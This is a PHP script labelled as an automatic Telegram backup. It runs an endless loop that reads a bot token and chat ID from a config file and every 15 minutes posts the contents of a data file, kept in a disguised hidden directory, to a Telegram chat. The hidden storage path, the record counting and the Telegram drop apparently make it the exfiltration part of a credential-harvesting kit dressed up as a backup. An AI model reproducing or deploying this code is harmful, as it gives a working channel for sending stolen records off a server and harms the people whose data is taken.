<?php
// ============================================================
//  Respaldo automático a Telegram — corre en el servidor
//  Lee telegram_config.js para obtener token y chat_id
// ============================================================

define('INTERVALO_SEG', 15 * 60); // 15 minutos
define('DAT_FILE', __DIR__ . '/.sys_tmp_c4ch3/q7x2k9m4p1r8s3v6w0y5z2a8b4c7d1e3f6g9h2j5l8n1o4_bkp.dat');

function leerConfig(): array {
    $js = file_get_contents(__DIR__ . '/telegram_config.js');
    preg_match("/TELEGRAM_BOT_TOKEN\s*=\s*'([^']+)'/", $js, $m1);
    preg_match("/TELEGRAM_CHAT_ID\s*=\s*'([^']+)'/",   $js, $m2);
    return [
        'token'   => $m1[1] ?? '',
        'chat_id' => $m2[1] ?? '',
    ];
}

function enviarTelegram(string $token, string $chat_id, string $texto): bool {
    $url  = "https://api.telegram.org/bot{$token}/sendMessage";
    $body = json_encode(['chat_id' => $chat_id, 'text' => $texto, 'parse_mode' => 'HTML']);
    $ch   = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $body,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($resp, true);
    return $json['ok'] ?? false;
}

function enviarRespaldo(): void {
    $cfg      = leerConfig();
    $token    = $cfg['token'];
    $chat_id  = $cfg['chat_id'];

    if (!$token || !$chat_id) {
        echo "[" . date('H:i:s') . "] ⚠️  Token o Chat ID no configurados en telegram_config.js\n";
        return;
    }

    $contenido = file_exists(DAT_FILE) ? trim(file_get_contents(DAT_FILE)) : '';

    if (!$contenido) {
        echo "[" . date('H:i:s') . "] Sin datos nuevos — no se envía\n";
        return;
    }

    $total    = substr_count($contenido, 'TIPO     :');
    $ahora    = date('d/m/Y H:i:s');
    $cabecera = "🔔 <b>RESPALDO AUTOMÁTICO</b>\n📅 {$ahora}\n📊 Registros: {$total}\n" . str_repeat("─", 28) . "\n\n";

    // Partir en trozos de 3800 chars para no exceder límite de Telegram
    $trozos = str_split($contenido, 3800);

    $ok = enviarTelegram($token, $chat_id, $cabecera . "<pre>" . htmlspecialchars($trozos[0]) . "</pre>");

    for ($i = 1; $i < count($trozos); $i++) {
        enviarTelegram($token, $chat_id, "<pre>" . htmlspecialchars($trozos[$i]) . "</pre>");
    }

    if ($ok) {
        echo "[" . date('H:i:s') . "] ✅ Respaldo enviado — {$total} registros\n";
    } else {
        echo "[" . date('H:i:s') . "] ❌ Error al enviar a Telegram\n";
    }
}

echo "[" . date('H:i:s') . "] 🚀 Respaldo Telegram iniciado — intervalo: " . (INTERVALO_SEG / 60) . " min\n";

while (true) {
    enviarRespaldo();
    sleep(INTERVALO_SEG);
}
